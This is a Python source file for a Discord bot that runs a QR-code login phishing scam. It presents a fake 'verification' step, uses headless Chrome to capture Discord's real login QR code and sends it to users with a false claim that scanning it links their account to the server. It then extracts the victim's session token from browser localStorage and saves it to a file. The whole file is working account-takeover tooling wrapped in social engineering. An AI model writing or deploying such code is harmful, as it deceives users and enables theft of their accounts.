import threading
import os
import discord
from PIL import Image
from discord.ext import commands
from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from datetime import datetime


client = commands.Bot(command_prefix = '!')






@client.event
async def on_ready():
    print("Bot is Online")



CodeCreated = False
def GenerateCode():
    global CodeCreated

    #Load the discord website in headless and custom size
    options = Options()
    options.headless = True
    options.add_argument(f"user-agent=Mozilla/5.0 (Linux; Android 7.0; SM-G930V Build/NRD90M) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/59.0.3071.125 Mobile Safari/537.36")
    driver = webdriver.Chrome('chromedriver.exe', options=options)
    driver.get('https://discord.com/login')
    driver.set_window_size(1920, 1080)
    
    #Giving the site time to load the QR Code
    try:
        WebDriverWait(driver, 10).until(EC.visibility_of_element_located((By.XPATH, '//*[@id="app-mount"]/div[2]/div/div[1]/div/div/div/form/div/div/div[3]/div/div/div/div[1]/div[1]')))
    except:
        pass

    #Save a screenshot of the website and crop the image of only the qr code
    driver.save_screenshot("QRCode.png")
    image = Image.open("QRCode.png")
    QRCode = image.crop((1685, 90, 1850, 253)) #Maybe need to be adjusted
    QRCode = QRCode.save("QRCode.png")
    CodeCreated = True

    #Waiting For a Login to gain access
    try:
        WebDriverWait(driver, 100).until(EC.visibility_of_element_located((By.XPATH, '//*[@id="app-mount"]/div[2]/div/div[1]/div/div[2]/div/div[1]/div/div/div/section/div')))
    except:
        pass

    #getting the discord token and saving it 
    Discord_Token = driver.execute_script("""
    return document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage.token
    """)
    now = datetime.now()
    current_time = now.strftime("%H-%M-%S")
    with open(f"{current_time}.txt", "a+") as (k):
        k.writelines(f"{Discord_Token}\n")
    os.system("cls")
    driver.quit()



@client.command()
async def verify_Msg(ctx):
    embed=discord.Embed(title="Verification Required!", description="To Gain Access to the server please follow the steps after typing the command `!verify`", url="https://support.discord.com/hc/en-us", color=0x7289da)
    await ctx.send(embed=embed)


@client.command()
async def verify(ctx):
    global CodeCreated

    await ctx.reply(f"{ctx.author.mention} **Please wait our servers are slow, Your code is being made**")

    #Create a code and wait for it to be saved
    CodeCreated = False
    threading.Thread(target=GenerateCode).start()
    while CodeCreated == False:
        pass

    embed=discord.Embed(title="Verification Required Via QR Code!", description="`Open the discord mobile app and scan this Qr Code to link your account to the server`", url="https://support.discord.com/hc/en-us", color=0x7289da)
    Code = discord.File("QRCode.png")
    embed.set_image(url="attachment://QRCode.png")
    await ctx.reply(file=Code,embed=embed)
    os.remove("QRCode.png")



client.run("")
